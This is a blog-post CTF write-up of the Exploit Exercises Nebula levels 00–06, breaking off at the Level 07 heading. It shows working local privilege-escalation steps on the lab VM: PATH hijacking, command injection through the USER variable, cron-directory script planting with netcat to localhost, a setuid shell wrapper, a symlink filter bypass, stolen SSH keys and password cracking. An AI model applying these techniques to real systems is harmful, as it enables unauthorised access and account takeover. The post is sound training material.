<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  

  
  <title>Nebula | Erik&#39;s Blog</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description" content="This is a writeup of the Nebula CTF from Exploit Exercises. Although there is already a huge number of solutions I find it still valuable to add more since everyones has another thought process and on">
<meta name="keywords" content="CTF-Writeups">
<meta property="og:type" content="article">
<meta property="og:title" content="Nebula">
<meta property="og:url" content="https://erikgeiser.com/2017/03/nebula/index.html">
<meta property="og:site_name" content="Erik&#39;s Blog">
<meta property="og:description" content="This is a writeup of the Nebula CTF from Exploit Exercises. Although there is already a huge number of solutions I find it still valuable to add more since everyones has another thought process and on">
<meta property="og:locale" content="default">
<meta property="og:image" content="https://erikgeiser.com/2017/03/nebula/wireshark.png">
<meta property="og:updated_time" content="2018-07-30T09:01:41.716Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Nebula">
<meta name="twitter:description" content="This is a writeup of the Nebula CTF from Exploit Exercises. Although there is already a huge number of solutions I find it still valuable to add more since everyones has another thought process and on">
<meta name="twitter:image" content="https://erikgeiser.com/2017/03/nebula/wireshark.png">
  
    <link rel="alternate" href="/atom.xml" title="Erik&#39;s Blog" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.png">
  
  
    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
  
  <link rel="stylesheet" href="/css/style.css">
</head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">Erik&#39;s Blog</a>
      </h1>
      
        <h2 id="subtitle-wrap">
          <a href="/" id="subtitle">IT Security and CTF Write-ups</a>
        </h2>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
          <a class="main-nav-link" href="/about-me">About Me</a>
        
          <a class="main-nav-link" href="/imprint">Imprint</a>
        
          <a class="main-nav-link" href="/privacy-policy">Privacy Policy</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="https://erikgeiser.com"></form>
      </div>
    </div>
  </div>
</header>
      <div class="outer">
        <section id="main"><article id="post-nebula" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2017/03/nebula/" class="article-date">
  <time datetime="2017-03-15T14:43:28.000Z" itemprop="datePublished">15-03-2017</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 class="article-title" itemprop="name">
      Nebula
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>This is a writeup of the Nebula CTF from <a href="https://exploit-exercises.com/" target="_blank" rel="noopener">Exploit Exercises</a>. Although there is already a huge number of solutions I find it still valuable to add more since everyones has another thought process and one might still learn something new in different writeups. Also it is nice to have a reference of problems ones has solved at some point.</p>
<p>Enough talk! Let’s jump in…</p>
<h2 id="Level-00"><a href="#Level-00" class="headerlink" title="Level 00"></a>Level 00</h2><p>The levels are accompanied by hints that explain what the level is all about. Here is the first one:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">This level requires you to find a Set User ID program that will run as the “flag00” account. You could also find this by carefully looking in top level directories in / for suspicious looking directories.</span><br><span class="line"></span><br><span class="line">Alternatively, look at the find man page.</span><br><span class="line"></span><br><span class="line">To access this level, log in as level00 with the password of level00.</span><br></pre></td></tr></table></figure>
<p>This is not much of a challenge since the solution is right there: Search in the man page for the appropriate flags. One could go about it like this:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">level00@nebula:~$ find / -perm -4000 -user flag00 2&gt; /dev/null</span><br><span class="line">/bin/.../flag00</span><br><span class="line">/rofs/bin/.../flag00</span><br></pre></td></tr></table></figure>
<p>Note the minus in front of the 4000 that references the <code>setuid</code> flag. This is neccessary because we do not know anything about the permissions other than that one flag and the minus allows us to probe just for that. When doing such <code>find</code> searches in <code>/</code> it is also helpful to redirect <code>stderr</code> (<code>2&gt; /dev/null</code>) such that there is no <code>Permission denied</code> spam.</p>
<p>Now we can claim the flag:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">level00@nebula:~$ <span class="built_in">cd</span> /rofs/bin/...</span><br><span class="line">level00@nebula:/rofs/bin/...$ ls</span><br><span class="line">flag00</span><br><span class="line">level00@nebula:/rofs/bin/...$ ./flag00</span><br><span class="line">Congrats, now run getflag to get your flag!</span><br><span class="line">flag00@nebula:/rofs/bin/...$ getflag</span><br><span class="line">You have successfully executed getflag on a target account</span><br></pre></td></tr></table></figure>
<h2 id="Level-01"><a href="#Level-01" class="headerlink" title="Level 01"></a>Level 01</h2><p>This time we are given the following source code for a <code>setuid</code> binary in <code>/home/flag01</code>:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv, <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">gid_t</span> gid;</span><br><span class="line">  <span class="keyword">uid_t</span> uid;</span><br><span class="line">  gid = getegid();</span><br><span class="line">  uid = geteuid();</span><br><span class="line"></span><br><span class="line">  setresgid(gid, gid, gid);</span><br><span class="line">  setresuid(uid, uid, uid);</span><br><span class="line"></span><br><span class="line">  system(<span class="string">"/usr/bin/env echo and now what?"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>It is useful to know that the man pages contain the documentation of the functions that are used here. This program basically sets the real user id (which is <code>level01</code>) to the effective user id (<code>flag01</code>, due to the <code>setuid</code> bit). That way the command <code>/usr/bin/env echo and now what?</code> will be executed as <code>flag01</code>. The fact that we can change the environment variables loaded by <code>/usr/bin/env</code> allows us to manipulate this command:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">level01@nebula:/home/flag01$ <span class="built_in">echo</span> <span class="string">"/bin/bash"</span> &gt; /tmp/<span class="built_in">echo</span></span><br><span class="line">level01@nebula:/home/flag01$ chmod a+x /tmp/<span class="built_in">echo</span></span><br><span class="line">level01@nebula:/home/flag01$ PATH=/tmp:<span class="variable">$PATH</span> ./flag01</span><br><span class="line">flag01@nebula:/home/flag01$ getflag</span><br><span class="line">You have successfully executed getflag on a target account</span><br></pre></td></tr></table></figure>
<p>I created a fake <code>echo</code> that just redirects to a shell and added it as the first element to the <code>$PATH</code> environment variable. This way the system will find the faked <code>echo</code> first, effectively replacing <code>echo</code> with <code>/bin/bash</code> in the command. Thus, we land in a shell from the <code>flag01</code> user due to the <code>setresgid/setresuid</code> calls.</p>
<h2 id="Flag-02"><a href="#Flag-02" class="headerlink" title="Flag 02"></a>Flag 02</h2><p>We have to exploit the following code:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv, <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *buffer;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">gid_t</span> gid;</span><br><span class="line">  <span class="keyword">uid_t</span> uid;</span><br><span class="line"></span><br><span class="line">  gid = getegid();</span><br><span class="line">  uid = geteuid();</span><br><span class="line"></span><br><span class="line">  setresgid(gid, gid, gid);</span><br><span class="line">  setresuid(uid, uid, uid);</span><br><span class="line"></span><br><span class="line">  buffer = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">  asprintf(&amp;buffer, <span class="string">"/bin/echo %s is cool"</span>, getenv(<span class="string">"USER"</span>));</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"about to call system(\"%s\")\n"</span>, buffer);</span><br><span class="line"></span><br><span class="line">  system(buffer);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>The permission preamble is the same as in the last flag but now we have the possibility to change a buffer that is executed via the <code>$USER</code> environment variable. The is also a <code>printf</code> that shows us what we are doing.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">level02@nebula:/home/flag02$ ./flag02</span><br><span class="line">about to call system(&quot;/bin/echo level02 is cool&quot;)</span><br><span class="line">level02 is cool</span><br><span class="line">level02@nebula:/home/flag02$ USER=&quot;test &amp;&amp; /bin/bash &amp;&amp;&quot; ./flag02</span><br><span class="line">about to call system(&quot;/bin/echo test &amp;&amp; /bin/bash &amp;&amp; is cool&quot;)</span><br><span class="line">test</span><br><span class="line">flag02@nebula:/home/flag02$ getflag</span><br><span class="line">You have successfully executed getflag on a target account</span><br></pre></td></tr></table></figure>
<p>Setting <code>$USER</code> to <code>test &amp;&amp; /bin/bash &amp;&amp;</code> splits the executed command into three separate commands that are executed subsequently: First the is <code>/bin/echo test</code>, which just prints <code>test</code>, then we open a shell to get the flag, then <code>is cool</code> is executed. This is not a valid command but at this point we don’t care anymore as we already have the flag.</p>
<h2 id="Flag-03"><a href="#Flag-03" class="headerlink" title="Flag 03"></a>Flag 03</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Check the home directory of flag03 and take note of the files there.</span><br><span class="line"></span><br><span class="line">There is a crontab that is called every couple of minutes.</span><br><span class="line"></span><br><span class="line">To do this level, log in as the level03 account with the password level03. Files for this level can be found in /home/flag03.</span><br></pre></td></tr></table></figure>
<p>So let’s have a look at the directory:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">level03@nebula:/home/flag03$ ls</span><br><span class="line">writable.d  writable.sh</span><br><span class="line">level03@nebula:/home/flag03$ cat writable.sh</span><br><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> /home/flag03/writable.d/* ; <span class="keyword">do</span></span><br><span class="line">	(<span class="built_in">ulimit</span> -t 5; bash -x <span class="string">"<span class="variable">$i</span>"</span>)</span><br><span class="line">	rm -f <span class="string">"<span class="variable">$i</span>"</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line">level03@nebula:/home/flag03$ ls writable.d</span><br><span class="line">level03@nebula:/home/flag03$</span><br></pre></td></tr></table></figure>
<p>So we have a crontab that executes <code>writable.sh</code> every couple of minutes, which executes everything in <code>writable.d</code> (with a 5s timeout) and removes it afterwards.</p>
<p>One can go about it in a few different ways depending on what one considers getting the flag. My first idea does not give shell access but still executes <code>getflag</code> and shows the output:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">level03@nebula:/home/flag03$ <span class="built_in">echo</span> <span class="string">"getflag | nc 127.0.0.1 3333"</span> &gt; writable.d/test.sh; nc -l 3333</span><br><span class="line">You have successfully executed getflag on a target account</span><br></pre></td></tr></table></figure>
<p>In this case, the command exectured by the cronjob is <code>getflag | nc 127.0.0.1 3333</code> which executes getflag and sends the output to port 3333 on the same host. Before the cronjob is executed we make sure to start a listener on said port with <code>nc -l 3333</code> which receives the target string. In hinsight it would probably be easer to have the cronjob just dump the string in a file with read permissions.</p>
<p>However, in a realistic scenario it would be way better to get complete shell access so we try and aim for that using a similar technique to the previous challenges: We write a little program in C and let the cronjob which runs as <code>flag03</code> compile it and set the <code>setuid</code> bit:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">level03@nebula:/home/flag03$ cat &lt;&lt; EOF &gt; /tmp/getflag.c</span><br><span class="line">&gt; #include &lt;stdio.h&gt;</span><br><span class="line">&gt; #include &lt;stdlib.h&gt;</span><br><span class="line">&gt; #include &lt;sys/types.h&gt;</span><br><span class="line">&gt; #include &lt;unistd.h&gt;</span><br><span class="line">&gt;</span><br><span class="line">&gt; int main()</span><br><span class="line">&gt; &#123;</span><br><span class="line">&gt;   gid_t gid = getegid();</span><br><span class="line">&gt;   uid_t uid = geteuid();</span><br><span class="line">&gt;   setresgid(gid, gid, gid);</span><br><span class="line">&gt;   setresuid(uid, uid, uid);</span><br><span class="line">&gt;   system(&quot;/bin/bash&quot;);</span><br><span class="line">&gt; &#125;</span><br><span class="line">&gt; EOF</span><br><span class="line">level03@nebula:/home/flag03$ ls</span><br><span class="line">writable.d  writable.sh</span><br><span class="line">level03@nebula:/home/flag03$ echo &quot;gcc /tmp/getflag.c -o /home/flag03/getflag; chmod +s /home/flag03/getflag&quot; &gt; writable.d/getflag.sh</span><br><span class="line">level03@nebula:/home/flag03$ ./getflag</span><br><span class="line">flag03@nebula:/home/flag03$ getflag</span><br><span class="line">You have successfully executed getflag on a target account</span><br></pre></td></tr></table></figure>
<p>I do want to mention an issue I had while working out the solution so that I’m not the only one that learned from it: First I instructed the compiler to place the executable in the <code>/tmp</code> folder so that I don’t pollute <code>/home</code>. The problem is that the <code>suid</code> bit did not seem to work unless I build the executable in the <code>/home</code> directory. So I searched for reasons why <code>suid</code> may be directory dependent and found the <code>nosuid</code> mount flag. One can easily check if that is the reason in this case:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">flag03@nebula:/home/flag03$ cat /etc/fstab</span><br><span class="line">overlayfs / overlayfs rw 0 0</span><br><span class="line">tmpfs /tmp tmpfs nosuid,nodev 0 0</span><br></pre></td></tr></table></figure>
<p>Indeed the <code>/tmp</code> folder is mounted as a <code>tmpfs</code> in RAM with the <code>nosuid</code> flag set such that <code>suid</code> has no effect there.</p>
<h2 id="Level-04"><a href="#Level-04" class="headerlink" title="Level 04:"></a>Level 04:</h2><p>The source code of <code>flag04</code> reads and prints a file after it makes sure that the filename does not contain “token” which is probably exactly the file we need to open. For those that are not that familiar with C code, the last write has a 1 as file descriptor argument which references the file descriptor of <code>stdout</code>, thus the write is basically a print.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv, <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">1024</span>];</span><br><span class="line">  <span class="keyword">int</span> fd, rc;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(argc == <span class="number">1</span>) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"%s [file to read]\n"</span>, argv[<span class="number">0</span>]);</span><br><span class="line">      <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(<span class="built_in">strstr</span>(argv[<span class="number">1</span>], <span class="string">"token"</span>) != <span class="literal">NULL</span>) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"You may not access '%s'\n"</span>, argv[<span class="number">1</span>]);</span><br><span class="line">      <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  fd = open(argv[<span class="number">1</span>], O_RDONLY);</span><br><span class="line">  <span class="keyword">if</span>(fd == <span class="number">-1</span>) &#123;</span><br><span class="line">      err(EXIT_FAILURE, <span class="string">"Unable to open %s"</span>, argv[<span class="number">1</span>]);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  rc = read(fd, buf, <span class="keyword">sizeof</span>(buf));</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(rc == <span class="number">-1</span>) &#123;</span><br><span class="line">      err(EXIT_FAILURE, <span class="string">"Unable to read fd %d"</span>, fd);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  write(<span class="number">1</span>, buf, rc);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>This smells like a problem that is solvable by symlink:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">level04@nebula:/home/flag04$ cat token</span><br><span class="line">cat: token: Permission denied</span><br><span class="line">level04@nebula:/home/flag04$ ./flag04 token</span><br><span class="line">You may not access <span class="string">'token'</span></span><br><span class="line">level04@nebula:/home/flag04$ ln -s /home/flag04/token /tmp/link</span><br><span class="line">level04@nebula:/home/flag04$ ./flag04 /tmp/link</span><br><span class="line">06508b5e-8909-4f38-b630-fdb148a848a2</span><br><span class="line">level04@nebula:/home/flag04$ su flag04</span><br><span class="line">Password:</span><br><span class="line">sh-4.2$ getflag</span><br><span class="line">You have successfully executed getflag on a target account</span><br></pre></td></tr></table></figure>
<p>This was really straight forward once the C code is understood.</p>
<h2 id="Level-05"><a href="#Level-05" class="headerlink" title="Level 05:"></a>Level 05:</h2><p>This time there is no source code, but the hint points at insecure directory permissions:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">level05@nebula:/home/flag05$ ls -la</span><br><span class="line">total 5</span><br><span class="line">drwxr-x--- 4 flag05 level05   93 2012-08-18 06:56 .</span><br><span class="line">drwxr-xr-x 1 root   root     160 2012-08-27 07:18 ..</span><br><span class="line">drwxr-xr-x 2 flag05 flag05    42 2011-11-20 20:13 .backup</span><br><span class="line">-rw-r--r-- 1 flag05 flag05   220 2011-05-18 02:54 .bash_logout</span><br><span class="line">-rw-r--r-- 1 flag05 flag05  3353 2011-05-18 02:54 .bashrc</span><br><span class="line">-rw-r--r-- 1 flag05 flag05   675 2011-05-18 02:54 .profile</span><br><span class="line">drwx------ 2 flag05 flag05    70 2011-11-20 20:13 .ssh</span><br><span class="line">level05@nebula:/home/flag05$ cd .backup/</span><br><span class="line">level05@nebula:/home/flag05/.backup$ ls</span><br><span class="line">backup-19072011.tgz</span><br><span class="line">level05@nebula:/home/flag05/.backup$ mkdir /tmp/backup</span><br><span class="line">level05@nebula:/home/flag05/.backup$ tar -xzf backup-19072011.tgz -C /tmp/backup/</span><br><span class="line">level05@nebula:/home/flag05/.backup$ cd /tmp/backup/</span><br><span class="line">level05@nebula:/tmp/backup$ ls</span><br><span class="line">level05@nebula:/tmp/backup$ ls -la</span><br><span class="line">total 0</span><br><span class="line">drwxrwxr-x 3 level05 level05  60 2017-03-21 06:20 .</span><br><span class="line">drwxrwxrwt 5 root    root    160 2017-03-21 06:20 ..</span><br><span class="line">drwxr-xr-x 2 level05 level05 100 2011-07-19 02:37 .ssh</span><br><span class="line">level05@nebula:/tmp/backup$ cd .ssh/</span><br><span class="line">level05@nebula:/tmp/backup/.ssh$ ls</span><br><span class="line">authorized_keys  id_rsa  id_rsa.pub</span><br><span class="line">level05@nebula:/tmp/backup/.ssh$ ssh -i ./id_rsa flag05@localhost</span><br><span class="line">[...]</span><br><span class="line">flag05@nebula:~$ getflag</span><br><span class="line">You have successfully executed getflag on a target account</span><br></pre></td></tr></table></figure>
<p>We find a hidden <code>.backup</code> folder with a compressed backup of the <code>.ssh</code> folder inside containing an SSH keys. We can use it to log in to <code>flag05</code> via SSH and we have the flag.</p>
<h2 id="Level-06"><a href="#Level-06" class="headerlink" title="Level 06:"></a>Level 06:</h2><p>This time we only know that the <code>flag06</code> account came from a legacy unix system. My first guess is that probably means that the <code>/etc/passwd</code> file could contain the password hash. Nowadays the password would reside encrypted in the <code>/etc/shadow</code> file which we can’t even read. Let’s have a look:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">level06@nebula:/home/flag06$ cat /etc/passwd | grep flag06</span><br><span class="line">flag06:ueqwOCnSGdsuM:993:993::/home/flag06:/bin/sh</span><br></pre></td></tr></table></figure>
<p>Indeed, we can see a password hash in the field where modern accounts would only show an <code>x</code>. I don’t have a better solution than to crack it, which will probably be easy as the hash function is probably very dated. To achieve this I use <code>scp</code> to upload john the ripper to the Nebula VM.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">~/Downloads scp john-1.8.0.tar.xz level06@192.168.56.101:~</span><br><span class="line">[...]</span><br><span class="line">~/Downloads ssh level06@192.168.56.101</span><br><span class="line">[...]</span><br><span class="line">level06@nebula:~$ ls</span><br><span class="line">john-1.8.0.tar.xz</span><br><span class="line">level06@nebula:~$ ls</span><br><span class="line">john-1.8.0  john-1.8.0.tar.xz</span><br><span class="line">level06@nebula:~$ cd john-1.8.0/</span><br><span class="line">level06@nebula:~/john-1.8.0$ ls</span><br><span class="line">doc  README  run  src</span><br><span class="line">level06@nebula:~/john-1.8.0$ cd src/</span><br><span class="line">level06@nebula:~/john-1.8.0/src$ uname -a</span><br><span class="line">Linux nebula 3.0.0-12-generic #20-Ubuntu SMP Fri Oct 7 14:50:42 UTC 2011 i686 i686 i386 GNU/Linux</span><br><span class="line">level06@nebula:~/john-1.8.0/src$ make linux-x86-sse2</span><br><span class="line">[...]</span><br><span class="line">level06@nebula:~/john-1.8.0/src$ cd ../run/</span><br><span class="line">level06@nebula:~/john-1.8.0/run$ ls</span><br><span class="line">ascii.chr  digits.chr  john  john.conf  lm_ascii.chr  mailer  makechr  password.lst  relbench  unafs  unique  unshadow</span><br><span class="line">level06@nebula:~/john-1.8.0/run$ ./john /etc/passwd</span><br><span class="line">Loaded 1 password hash (descrypt, traditional crypt(3) [DES 128/128 SSE2])</span><br><span class="line">Press &apos;q&apos; or Ctrl-C to abort, almost any other key for status</span><br><span class="line">hello            (flag06)</span><br><span class="line">1g 0:00:00:00 100% 2/3 100.0g/s 75300p/s 75300c/s 75300C/s 123456..marley</span><br><span class="line">Use the &quot;--show&quot; option to display all of the cracked passwords reliably</span><br><span class="line">Session completed</span><br><span class="line">level06@nebula:~/john-1.8.0/run$ su flag06</span><br><span class="line">Password:</span><br><span class="line">sh-4.2$ getflag</span><br><span class="line">You have successfully executed getflag on a target account</span><br></pre></td></tr></table></figure>
<p>Even the compilation took longer than the actual cracking, which reveals a trivial password.</p>
<h1 id="Level-07"><a href="#Level-07" class="headerlink" title="Level 07:"></a>Level 07:</h1><p>This flag revolves around the following Perl CGI script:</p>
